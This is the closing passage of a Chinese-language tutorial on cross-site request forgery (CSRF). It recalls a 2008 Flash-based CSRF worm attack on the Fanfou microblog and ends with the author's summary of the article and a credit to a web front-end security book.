除此之外，这种跨域获取信息的方法还可以应用在CSRF蠕虫之中，同样是在2008年，饭否（`www.fanfou.com`）就被基于Flash的CSRF蠕虫攻击，当时包含饭否CSRF蠕虫的Flash游戏界面如下：

![](http://drops.javaweb.org/uploads/images/6ccd9d9011ca4ea086602f5a1f0f7db3f87f44f4.jpg)

0x09 结束
=======

* * *

由于水平有限，本文写到这里就差不多结束了，里面是我对CSRF几乎所有的认知，包括基本概念、攻击原理、攻击目的、攻击手段以及防御方法等等。需要特别说明的是，文中有许多内容来自《Web前端黑客技术解密》这本书。